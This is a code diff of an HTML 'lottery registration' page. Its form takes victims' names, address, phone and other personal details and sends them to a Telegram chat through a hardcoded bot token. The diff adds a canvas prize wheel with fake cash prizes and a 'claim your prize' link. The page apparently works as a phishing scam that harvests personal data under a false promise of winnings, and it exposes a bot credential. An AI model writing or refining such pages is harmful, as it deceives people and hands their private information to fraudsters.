@@ -9,6 +9,8 @@
             font-family: Arial, sans-serif;
             background-color: #f2f2f2;
             text-align: center;
+            margin: 0;
+            padding: 0;
         }
         h1 {
             color: green;
@@ -19,7 +21,7 @@
             padding: 20px;
             background-color: white;
             border-radius: 10px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
         }
         input, select, button {
             display: block;
@@ -27,50 +29,29 @@
             margin: 10px auto;
             padding: 10px;
             font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
         }
         button {
             background-color: #4CAF50;
             color: white;
+            border: none;
             cursor: pointer;
         }
-        .game-list button {
-            background-color: #007BFF;
+        #wheelCanvas {
+            margin-top: 20px;
+            cursor: pointer;
         }
-        .dice, .spinner {
-            font-size: 50px;
-            margin: 20px auto;
-            color: #333;
-        }
-        .board-container {
-            position: relative;
-            margin: 20px auto;
-        }
-        #spinner {
-            width: 300px;
-            height: 300px;
-            border: 10px solid #ccc;
-            border-radius: 50%;
-            position: relative;
-        }
-        .pointer {
-            position: absolute;
-            top: -20px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 0;
-            height: 0;
-            border-left: 20px solid transparent;
-            border-right: 20px solid transparent;
-            border-bottom: 40px solid red;
+        .result {
+            margin-top: 20px;
+            font-size: 20px;
+            font-weight: bold;
+            color: green;
         }
     </style>
 </head>
 <body>
 
 <div class="container" id="formContainer">
-    <h2>Lottery Registration Form</h2>
+    <h2>Lottery Registration</h2>
     <form id="lotteryForm">
         <input type="text" id="firstName" placeholder="First Name" required>
         <input type="text" id="middleName" placeholder="Middle Name">
@@ -86,37 +67,29 @@
     </form>
 </div>
 
-<div class="container" id="welcomeContainer" style="display: none;">
-    <h1 id="welcomeMessage"></h1>
-    <h3>Select a game to play:</h3>
-    <div class="game-list">
-        <button onclick="playDice()">🎲 Roll the Dice</button>
-        <button onclick="playSpin()">🎡 Spin the Board</button>
-    </div>
-</div>
-
 <div class="container" id="gameContainer" style="display: none;">
-    <div id="gameResult" style="font-size: 18px;"></div>
-    <div class="dice" id="diceDisplay" style="display: none;"></div>
-
-    <!-- Spinner -->
-    <div class="board-container" id="spinnerContainer" style="display: none;">
-        <div class="pointer"></div>
-        <div id="spinner"></div>
-    </div>
+    <h1>Welcome to the Spinning Board!</h1>
+    <p>Tap the spinning board to test your luck!</p>
+    <canvas id="wheelCanvas" width="300" height="300"></canvas>
+    <div class="result" id="result"></div>
 </div>
 
 <script>
 const TELEGRAM_BOT_TOKEN = '7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY';
 const TELEGRAM_CHAT_ID = '874563737';
+const prizes = ["$2000", "$5000", "$1000", "$15000", "$20000", "$30000", "Try Again"];
 
-// Form Submission to Telegram
+const formContainer = document.getElementById('formContainer');
+const gameContainer = document.getElementById('gameContainer');
+const resultElement = document.getElementById('result');
+
+// Handle Form Submission
 document.getElementById('lotteryForm').addEventListener('submit', function (e) {
     e.preventDefault();
 
     const firstName = document.getElementById('firstName').value;
-    const lastName = document.getElementById('lastName').value;
     const middleName = document.getElementById('middleName').value;
+    const lastName = document.getElementById('lastName').value;
     const address = document.getElementById('address').value;
     const phone = document.getElementById('phone').value;
     const gender = document.getElementById('gender').value;
@@ -128,61 +101,97 @@ document.getElementById('lotteryForm').addEventListener('submit', function (e) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
     }).then(() => {
-        document.getElementById('formContainer').style.display = 'none';
-        document.getElementById('welcomeContainer').style.display = 'block';
-        document.getElementById('welcomeMessage').innerHTML = 
-            `Dear <b style="color: green;">${firstName} ${lastName}</b>, we welcome you to AI Lottery Page!`;
+        formContainer.style.display = 'none';
+        gameContainer.style.display = 'block';
     });
 });
 
-// Rolling Dice Game
-function playDice() {
-    document.getElementById('diceDisplay').style.display = 'block';
-    const diceElement = document.getElementById('diceDisplay');
-    let roll = 0;
+// Spinning Board
+const canvas = document.getElementById('wheelCanvas');
+const ctx = canvas.getContext('2d');
+const segments = prizes.length;
+const centerX = canvas.width / 2;
+const centerY = canvas.height / 2;
+const radius = centerX;
 
-    const diceAnimation = setInterval(() => {
-        roll = Math.ceil(Math.random() * 6);
-        diceElement.innerHTML = `🎲 ${roll}`;
-    }, 100);
+// Draw the spinning wheel
+function drawWheel() {
+    for (let i = 0; i < segments; i++) {
+        const angle = (2 * Math.PI / segments) * i;
 
-    setTimeout(() => {
-        clearInterval(diceAnimation);
-        const prizes = ["$1000", "$2000", "$5000", "$10000", "$20000"];
-        const prize = prizes[roll - 1]; // Map roll to prize
-        document.getElementById('gameResult').innerHTML = 
-            `🎉 Congratulations! You rolled ${roll} and won ${prize}!`;
-    }, 3000);
+        ctx.beginPath();
+        ctx.moveTo(centerX, centerY);
+        ctx.arc(centerX, centerY, radius, angle, angle + (2 * Math.PI / segments));
+        ctx.closePath();
+        ctx.fillStyle = i % 2 === 0 ? "#FFDD57" : "#FF6347";
+        ctx.fill();
+
+        // Add text
+        ctx.save();
+        ctx.translate(centerX, centerY);
+        ctx.rotate(angle + Math.PI / segments);
+        ctx.textAlign = "right";
+        ctx.font = "14px Arial";
+        ctx.fillStyle = "black";
+        ctx.fillText(prizes[i], radius - 10, 5);
+        ctx.restore();
+    }
 }
+drawWheel();
 
-// Spin the Board Game
-function playSpin() {
-    document.getElementById('spinnerContainer').style.display = 'block';
-    const spinner = document.getElementById('spinner');
-    const prizes = ['$2000', '$5000', '$1000', '$15000', '$20000', '$30000', 'Try Again'];
-    let rotation = 0;
+let spinning = false;
+let finalAngle = 0;
 
-    const spinAnimation = setInterval(() => {
-        rotation += 10;
-        spinner.style.transform = `rotate(${rotation}deg)`;
-    }, 50);
+// Handle Spin
+canvas.addEventListener('click', function () {
+    if (spinning) return;
 
-    setTimeout(() => {
-        clearInterval(spinAnimation);
-        const finalIndex = Math.floor(Math.random() * prizes.length);
-        const finalPrize = prizes[finalIndex];
-        const stopRotation = rotation + (360 / prizes.length) * finalIndex;
-        spinner.style.transform = `rotate(${stopRotation}deg)`;
+    spinning = true;
+    let spinAngle = Math.random() * 3600 + 720; // Random spin angle
+    const spinDuration = 5000;
+    const startTime = performance.now();
 
-        setTimeout(() => {
-            if (finalPrize === 'Try Again') {
-                alert('Try Again!');
-            } else {
-                alert(`🎉 Congratulations! You won ${finalPrize}`);
-            }
-            document.getElementById('gameResult').innerHTML = `Result: ${finalPrize}`;
-        }, 500);
-    }, 5000);
+    function animateSpin(time) {
+        const elapsed = time - startTime;
+        const progress = Math.min(elapsed / spinDuration, 1);
+        const currentAngle = (finalAngle + spinAngle * (1 - Math.pow(1 - progress, 3))) % 360;
+
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.save();
+        ctx.translate(centerX, centerY);
+        ctx.rotate(currentAngle * Math.PI / 180);
+        ctx.translate(-centerX, -centerY);
+        drawWheel();
+        ctx.restore();
+
+        if (progress < 1) {
+            requestAnimationFrame(animateSpin);
+        } else {
+            spinning = false;
+            finalAngle = currentAngle;
+            displayResult(currentAngle);
+        }
+    }
+
+    requestAnimationFrame(animateSpin);
+});
+
+// Determine prize
+function displayResult(angle) {
+    const segmentAngle = 360 / segments;
+    const index = Math.floor(((360 - angle % 360) % 360) / segmentAngle);
+    const prize = prizes[index];
+
+    if (prize === "Try Again") {
+        resultElement.innerText = "Try Again! Better luck next time.";
+    } else {
+        resultElement.innerHTML = `
+            🎉 Congratulations! You won ${prize}!
+            <br><a href="winner.html?prize=${prize}" target="_blank">
+                Click here to claim your prize!
+            </a>
+        `;
+    }
 }
 </script>
 
